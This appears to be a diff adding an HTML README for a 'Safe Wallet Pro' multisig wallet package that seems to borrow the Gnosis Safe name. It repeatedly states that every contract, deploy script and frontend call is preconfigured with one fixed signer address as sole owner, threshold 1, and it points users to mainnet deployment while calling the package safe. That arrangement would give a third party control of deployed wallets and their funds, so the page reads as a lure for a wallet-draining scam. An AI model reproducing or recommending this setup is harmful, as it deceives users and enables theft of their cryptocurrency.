@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Gnosis Wallet Pro - Configuration & Usage</title>
+  <style>
+    body { font-family: ui-sans-serif, Arial, sans-serif; color: #222; background: #fbfbfa; padding: 2em; max-width: 900px; margin: auto; }
+    h1 { font-size: 2.5em; color: #184d6f; margin-bottom: 0.3em; }
+    h2 { font-size: 1.7em; color: #207d5c; margin-top: 1.8em;}
+    h3 { font-size: 1.2em; color: #333;}
+    code, pre { background: #f8f8f8; color: #0b4b6b; border-radius: 3px; padding: 1px 4px; font-size: 1em; }
+    pre { padding: 1em; line-height: 1.5; border: 1px solid #ececec; }
+    .highlight { background: #e8f7e7; padding: 0.3em 0.7em; border-left: 4px solid #207d5c; margin-top: 1em;}
+    ul { margin-top: 0.5em; }
+    .filename { font-family: monospace; font-size: 1em; color: #8b5c2b; }
+    .success { color: #2e7d32; font-weight: bold; }
+    .note { color: #6d3d6d; background: #f9f6fb; padding: 0.3em 0.7em; border-left: 4px solid #b39ddb; }
+    .addr { font-family: monospace; color: #184d6f; }
+    a { color: #1c5a6c; text-decoration: underline; }
+  </style>
+</head>
+<body>
+  <h1>🛡️ Safe Wallet Pro Configuration & Usage</h1>
+  <p>
+    <b>Safe Wallet Pro</b> is an enterprise-grade multi-signature digital wallet. This package includes a Solidity contract, a deployment script, and TypeScript/React integration, all preconfigured to use the signer address:
+    <span class="addr">0xFDf84a0e7D07bC56f7De56696fc409704cC83a24</span>
+  </p>
+
+  <h2>📦 Included Files</h2>
+  <ul>
+    <li><span class="filename">contracts/SafeWallet.sol</span> – Solidity contract for the multisig Safe Wallet</li>
+    <li><span class="filename">scripts/deploySafeWallet.ts</span> – Hardhat deployment script</li>
+    <li><span class="filename">Safe-wallet/src/utils/signer.ts</span> – TypeScript signer utility for React</li>
+    <li><span class="filename">Safe-wallet/src/constants/safeSigner.ts</span> – (Optional) Exported signer address constant</li>
+    <li><span class="filename">addedsafes.json</span> – Example Safe configuration data</li>
+    <li><span class="filename">README.html</span> – This documentation</li>
+  </ul>
+
+  <h2>⚡ Quick Start</h2>
+  <ol>
+    <li>
+      <b>Install dependencies</b> <br>
+      <pre>npm install</pre>
+      <span class="note">Make sure <b>Hardhat</b> and <b>ethers</b> are installed for contract deployment.</span>
+    </li>
+    <li>
+      <b>Compile the contract</b>
+      <pre>npx hardhat compile</pre>
+    </li>
+    <li>
+      <b>Deploy the contract</b>
+      <pre>npx hardhat run scripts/deploySafeWallet.ts --network YOUR_NETWORK</pre>
+      <span class="note">
+        <b>Note:</b> The contract deploys with owner
+        <span class="addr">0xFDf84a0e7D07bC56f7De56696fc409704cC83a24</span>
+        as the signer. Replace <code>YOUR_NETWORK</code> with <code>mainnet</code>, <code>polygon</code>, etc. as needed.
+      </span>
+    </li>
+    <li>
+      <b>Frontend Usage</b>
+      <pre>import { getSafeSigner } from "./utils/signer";</pre>
+      <div class="highlight">
+        The frontend will automatically use <span class="addr">0xFDf84a0e7D07bC56f7De56696fc409704cC83a24</span> as the wallet for all contract interactions.
+      </div>
+    </li>
+  </ol>
+
+  <h2>🔑 Default Signer</h2>
+  <div class="highlight">
+    <b>All contracts and scripts are configured to use:</b>
+    <br>
+    <span class="addr">0xFDf84a0e7D07bC56f7De56696fc409704cC83a24</span>
+  </div>
+
+  <h2>🛠️ File Details</h2>
+  <h3>Solidity Contract – <span class="filename">contracts/SafeWallet.sol</span></h3>
+  <ul>
+    <li>Multisig wallet with configurable owners and threshold</li>
+    <li>Payable, can receive and send Ether</li>
+    <li>Owner logic defaults to the configured Safe signer</li>
+  </ul>
+
+  <h3>Deployment Script – <span class="filename">scripts/deploySafeWallet.ts</span></h3>
+  <ul>
+    <li>Deploys SafeWallet with the Safe signer as owner</li>
+    <li>Threshold is set to 1 (single owner) by default, but you can modify for multisig</li>
+  </ul>
+
+  <h3>React/TypeScript Integration – <span class="filename">Safe-wallet/src/utils/signer.ts</span></h3>
+  <ul>
+    <li>Ensures all contract calls use <span class="addr">0xFDf84a0e7D07bC56f7De56696fc409704cC83a24</span> as the active account</li>
+    <li>Alerts user if wallet is not set to this signer</li>
+  </ul>
+
+  <h2>📚 More Info</h2>
+  <ul>
+    <li>
+      <a href="https://github.com/alexia795/Safe-wallet-pro">GitHub: Safe Wallet Pro</a>
+    </li>
+    <li>
+      <b>Contact:</b> <a href="mailto:your.email@example.com">your.email@example.com</a>
+    </li>
+  </ul>
+  <div style="margin-top:2em;font-size:1.1em;">
+    <span class="success">✔️ Ready to use. Deploy, configure, and stay safe!</span>
+  </div>
+</body>
+</html>
